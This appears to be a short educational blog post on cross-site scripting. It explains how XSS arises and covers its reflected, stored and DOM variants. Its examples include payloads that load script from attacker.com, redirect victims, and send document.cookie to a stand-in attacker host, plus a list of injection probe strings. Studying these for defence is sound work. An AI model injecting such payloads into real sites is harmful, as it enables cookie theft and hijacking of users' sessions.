---
title: Cross Site Scripting (XSS)
date: 2022-05-18 12:00:00 -0400
image: 
 path: https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/ctf/ctf0.jpg
 height: 3000
 width: 450
categories: [HTB Writeups, Cyber Apocalypse CTF]
tags: [web security, ctf, owasp]
---

Cross-site scripting known as XSS is a web vulnerability in which malicious scripts are injected int benign and trusted websites. XSS occur when an attacker send malicious code in any user input fields in a browser to a different end-user.

## Mechanisms

In an XSS attack the attacker inject script in HTML code so you'll have to know javascript and HTML syntax, wbe uses scripts to control client-side application logic and make the website interactive, for example this script generates _Hello!_ pop-up on the web page:

```
<html>
    <script>alert("Hello!");</script>
    <h1>Welcome to my page</h1>
<html>

```

Script like this that are embedded in HTML file instead of loaded from are separated file are called _inline scripts_. These script causes XSS vulnerabilities, scripts can also be loaded from an external file like this: `<script src="URL_OF_EXTERNAL_FILE"></script>`

If the website doesn't validate the input before render the message, it will cause XSS, _validating_ user input means that the application checks that the user input meets a certain standard, _sanitizing_ in the other hand means that the application modifies special characters in the input that can be used to interfere with HTML logic before further processing.

As a result the inline script will cause a redirection to an another url. The src attribute of HTML script tag allwo to load javascript form external source, this code will execute the content of *[](https://attacker.om/xss.js/*)[https://attacker.om/xss.js/*](https://attacker.om/xss.js/*) on the victim browser:

```
<script src=http://attacker.com/xss.js></script>

```

This example is not exploitable because there is no way of inject this in other users pages, but let´s say the site allow users to subscribe to a newsletter with the URL `https://subscribe.com?email?=USER_EMAIL` after the user visit this page, they are automatically subscribed, and the confirmation message will appear on the web, so we can inject xss payload for users who visit this URL `https://subscribe,com?email=<script>location="<http://attacker.com>";</script>` since the malicious script is incorporated in the page, the user will think its safe, so we can access any resources that the browser stores for that site, for example this code will steal user cookies by sending a request to the attacker IP.

```
<script>image=new Image();
image.src='http://atttacker_site_ip/?c='+document.cookie;</script>

```

## Reflected XSS

Input from a user is directly returned to the browser, permitting injection of arbitrary content A classic example would be a URL, which contain a parameter that can be altered by a user, where the input is mirrored and made visible. Example URL: '[](https://example.com/?user=jesus)[https://example.com/?user=jesus](https://example.com/?user=jesus)' Example Output:

```
<span id='user'>
	<b> Hi jesus</b>
</span>

```

## Stored XSS

Input from a user is stored on the server (database) and returned later without proper escaping and sanitization to the user

## DOM XSS

Input from a user is inserted into the page's DOM without proper handling, enabling insertion of arbitrary nodes

![https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli1.jpg](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli1.jpg)

Recognition for XSS

-   Figure out where it goes, embedded in a tag attr or embedded in a script?
-   Figure out how special characters are handled: A good way is to input something like `< > ' " { } ; :`
-   `"><h1>test</h1>`
-   `'+alert(1)+'`
-   `"onmouseover="alert(1)`
-   `http://onmouseover="alert(1)`